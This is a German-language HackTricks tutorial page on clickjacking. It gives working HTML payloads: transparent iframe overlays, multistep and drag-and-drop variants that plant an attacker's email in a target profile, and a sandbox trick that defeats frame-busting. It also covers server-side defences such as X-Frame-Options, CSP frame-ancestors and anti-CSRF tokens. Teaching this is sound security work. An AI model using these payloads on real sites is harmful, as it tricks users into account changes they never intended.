# Clickjacking

{% hint style="success" %}
Lerne & √ºbe AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lerne & √ºbe GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterst√ºtze HackTricks</summary>

* √úberpr√ºfe die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Tritt der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folge** uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teile Hacking-Tricks, indem du PRs zu den** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos einreichst.

</details>
{% endhint %}

<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Verwende [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=clickjacking), um einfach **Workflows** zu erstellen und zu **automatisieren**, die von den **fortschrittlichsten** Community-Tools der Welt unterst√ºtzt werden.\
Erhalte heute Zugang:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=clickjacking" %}

## Was ist Clickjacking

Bei einem Clickjacking-Angriff wird ein **Benutzer** **get√§uscht**, indem er auf ein **Element** auf einer Webseite klickt, das entweder **unsichtbar** oder als ein anderes Element getarnt ist. Diese Manipulation kann zu unbeabsichtigten Konsequenzen f√ºr den Benutzer f√ºhren, wie z.B. dem Herunterladen von Malware, der Weiterleitung zu b√∂sartigen Webseiten, der Bereitstellung von Anmeldedaten oder sensiblen Informationen, Geldtransfers oder dem Online-Kauf von Produkten.

### Vorab ausgef√ºllte Formulare

Manchmal ist es m√∂glich, **den Wert von Feldern eines Formulars mit GET-Parametern beim Laden einer Seite auszuf√ºllen**. Ein Angreifer kann dieses Verhalten ausnutzen, um ein Formular mit beliebigen Daten auszuf√ºllen und die Clickjacking-Nutzlast zu senden, damit der Benutzer die Schaltfl√§che "Absenden" dr√ºckt.

### Formular mit Drag&Drop ausf√ºllen

Wenn du m√∂chtest, dass der Benutzer ein **Formular ausf√ºllt**, aber ihn nicht direkt bitten m√∂chtest, bestimmte Informationen (wie die E-Mail-Adresse oder ein spezifisches Passwort, das du kennst) einzugeben, kannst du ihn einfach bitten, etwas zu **Drag&Drop**, das deine kontrollierten Daten eingibt, wie in [**diesem Beispiel**](https://lutfumertceylan.com.tr/posts/clickjacking-acc-takeover-drag-drop/).

### Grundlegende Nutzlast
```markup
<style>
iframe {
position:relative;
width: 500px;
height: 700px;
opacity: 0.1;
z-index: 2;
}
div {
position:absolute;
top:470px;
left:60px;
z-index: 1;
}
</style>
<div>Click me</div>
<iframe src="https://vulnerable.com/email?email=asd@asd.asd"></iframe>
```
### Multistep Payload
```markup
<style>
iframe {
position:relative;
width: 500px;
height: 500px;
opacity: 0.1;
z-index: 2;
}
.firstClick, .secondClick {
position:absolute;
top:330px;
left:60px;
z-index: 1;
}
.secondClick {
left:210px;
}
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://vulnerable.net/account"></iframe>
```
### Drag\&Drop + Click-Payload
```markup
<html>
<head>
<style>
#payload{
position: absolute;
top: 20px;
}
iframe{
width: 1000px;
height: 675px;
border: none;
}
.xss{
position: fixed;
background: #F00;
}
</style>
</head>
<body>
<div style="height: 26px;width: 250px;left: 41.5%;top: 340px;" class="xss">.</div>
<div style="height: 26px;width: 50px;left: 32%;top: 327px;background: #F8F;" class="xss">1. Click and press delete button</div>
<div style="height: 30px;width: 50px;left: 60%;bottom: 40px;background: #F5F;" class="xss">3.Click me</div>
<iframe sandbox="allow-modals allow-popups allow-forms allow-same-origin allow-scripts" style="opacity:0.3"src="https://target.com/panel/administration/profile/"></iframe>
<div id="payload" draggable="true" ondragstart="event.dataTransfer.setData('text/plain', 'attacker@gmail.com')"><h3>2.DRAG ME TO THE RED BOX</h3></div>
</body>
</html>
```
### XSS + Clickjacking

Wenn Sie einen **XSS-Angriff identifiziert haben, der erfordert, dass ein Benutzer** auf ein Element klickt, um den XSS **auszul√∂sen** und die Seite **anf√§llig f√ºr Clickjacking** ist, k√∂nnten Sie dies ausnutzen, um den Benutzer zu t√§uschen, auf die Schaltfl√§che/den Link zu klicken.\
Beispiel:\
_Sie haben einen **self XSS** in einigen privaten Details des Kontos gefunden (Details, die **nur Sie festlegen und lesen k√∂nnen**). Die Seite mit dem **Formular**, um diese Details festzulegen, ist **anf√§llig** f√ºr **Clickjacking** und Sie k√∂nnen das **Formular** mit den GET-Parametern **vorbef√ºllen**._\
\_\_Ein Angreifer k√∂nnte einen **Clickjacking**-Angriff auf diese Seite vorbereiten, indem er das **Formular** mit der **XSS-Nutzlast** **vorbef√ºllt** und den **Benutzer** dazu bringt, das Formular **abzusenden**. Wenn das Formular also **eingereicht wird** und die Werte ge√§ndert werden, wird der **Benutzer den XSS ausf√ºhren**.

## Strategien zur Minderung von Clickjacking

### Client-Seitige Abwehrma√ünahmen

Skripte, die auf der Client-Seite ausgef√ºhrt werden, k√∂nnen Ma√ünahmen ergreifen, um Clickjacking zu verhindern:

* Sicherstellen, dass das Anwendungsfenster das Haupt- oder oberste Fenster ist.
* Alle Frames sichtbar machen.
* Klicks auf unsichtbare Frames verhindern.
* Benutzer √ºber potenzielle Clickjacking-Versuche informieren und warnen.

Diese Frame-Busting-Skripte k√∂nnen jedoch umgangen werden:

* **Sicherheitseinstellungen der Browser:** Einige Browser k√∂nnten diese Skripte basierend auf ihren Sicherheitseinstellungen oder mangelnder JavaScript-Unterst√ºtzung blockieren.
* **HTML5 iframe `sandbox` Attribut:** Ein Angreifer kann Frame-Buster-Skripte neutralisieren, indem er das `sandbox`-Attribut mit den Werten `allow-forms` oder `allow-scripts` ohne `allow-top-navigation` festlegt. Dies verhindert, dass das iframe √ºberpr√ºft, ob es das oberste Fenster ist, z.B.,
```html
<iframe id="victim_website" src="https://victim-website.com" sandbox="allow-forms allow-scripts"></iframe>
```
Die `allow-forms` und `allow-scripts` Werte erm√∂glichen Aktionen innerhalb des iframes, w√§hrend die Navigation auf der obersten Ebene deaktiviert wird. Um die beabsichtigte Funktionalit√§t der angegriffenen Seite sicherzustellen, k√∂nnten zus√§tzliche Berechtigungen wie `allow-same-origin` und `allow-modals` erforderlich sein, abh√§ngig von der Art des Angriffs. Nachrichten in der Browser-Konsole k√∂nnen Hinweise darauf geben, welche Berechtigungen erlaubt werden sollen.

### Serverseitige Abwehrma√ünahmen

#### X-Frame-Options

Der **`X-Frame-Options` HTTP-Antwortheader** informiert Browser √ºber die Legitimit√§t der Darstellung einer Seite in einem `<frame>` oder `<iframe>`, um Clickjacking zu verhindern:

* `X-Frame-Options: deny` - Keine Domain kann den Inhalt einrahmen.
* `X-Frame-Options: sameorigin` - Nur die aktuelle Seite kann den Inhalt einrahmen.
* `X-Frame-Options: allow-from https://trusted.com` - Nur die angegebene 'uri' kann die Seite einrahmen.
* Beachten Sie die Einschr√§nkungen: Wenn der Browser diese Direktive nicht unterst√ºtzt, funktioniert sie m√∂glicherweise nicht. Einige Browser bevorzugen die CSP frame-ancestors Direktive.

#### Content Security Policy (CSP) frame-ancestors Direktive

Die **`frame-ancestors` Direktive in CSP** ist die empfohlene Methode zum Schutz vor Clickjacking:

* `frame-ancestors 'none'` - √Ñhnlich wie `X-Frame-Options: deny`.
* `frame-ancestors 'self'` - √Ñhnlich wie `X-Frame-Options: sameorigin`.
* `frame-ancestors trusted.com` - √Ñhnlich wie `X-Frame-Options: allow-from`.

Zum Beispiel erlaubt die folgende CSP nur das Einrahmen von derselben Domain:

`Content-Security-Policy: frame-ancestors 'self';`

Weitere Details und komplexe Beispiele finden Sie in der [frame-ancestors CSP-Dokumentation](https://w3c.github.io/webappsec-csp/document/#directive-frame-ancestors) und in der [CSP frame-ancestors Dokumentation von Mozilla](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors).

### Content Security Policy (CSP) mit `child-src` und `frame-src`

Die **Content Security Policy (CSP)** ist eine Sicherheitsma√ünahme, die hilft, Clickjacking und andere Code-Injektionsangriffe zu verhindern, indem sie angibt, welche Quellen der Browser zulassen soll, um Inhalte zu laden.

#### `frame-src` Direktive

* Definiert g√ºltige Quellen f√ºr Frames.
* Ist spezifischer als die `default-src` Direktive.
```
Content-Security-Policy: frame-src 'self' https://trusted-website.com;
```
Diese Richtlinie erlaubt Frames von derselben Herkunft (self) und https://trusted-website.com.

#### `child-src` Direktive

* Eingef√ºhrt in CSP Level 2, um g√ºltige Quellen f√ºr Web-Worker und Frames festzulegen.
* Dient als Fallback f√ºr frame-src und worker-src.
```
Content-Security-Policy: child-src 'self' https://trusted-website.com;
```
Diese Richtlinie erlaubt Frames und Worker von derselben Herkunft (self) und https://trusted-website.com.

**Nutzungsnotizen:**

* Abwertung: child-src wird zugunsten von frame-src und worker-src schrittweise eingestellt.
* Fallback-Verhalten: Wenn frame-src fehlt, wird child-src als Fallback f√ºr Frames verwendet. Wenn beide fehlen, wird default-src verwendet.
* Strikte Quelldefinition: Nur vertrauensw√ºrdige Quellen in den Direktiven einbeziehen, um Ausnutzung zu verhindern.

#### JavaScript Frame-Breaking Scripts

Obwohl nicht v√∂llig narrensicher, k√∂nnen auf JavaScript basierende Frame-Busting-Skripte verwendet werden, um zu verhindern, dass eine Webseite in einem Frame angezeigt wird. Beispiel:
```javascript
if (top !== self) {
top.location = self.location;
}
```
#### Verwendung von Anti-CSRF-Token

* **Token-Validierung:** Verwenden Sie Anti-CSRF-Token in Webanwendungen, um sicherzustellen, dass zustandsver√§ndernde Anfragen absichtlich vom Benutzer und nicht √ºber eine Clickjacked-Seite vorgenommen werden.

## Referenzen

* [**https://portswigger.net/web-security/clickjacking**](https://portswigger.net/web-security/clickjacking)
* [**https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking\_Defense\_Cheat\_Sheet.html**](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking\_Defense\_Cheat\_Sheet.html)

<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Verwenden Sie [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=clickjacking), um einfach **Workflows** zu erstellen und zu **automatisieren**, die von den **fortschrittlichsten** Community-Tools der Welt unterst√ºtzt werden.\
Zugang heute erhalten:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=clickjacking" %}

{% hint style="success" %}
Lernen & √ºben Sie AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lernen & √ºben Sie GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks unterst√ºtzen</summary>

* √úberpr√ºfen Sie die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.

</details>
{% endhint %}
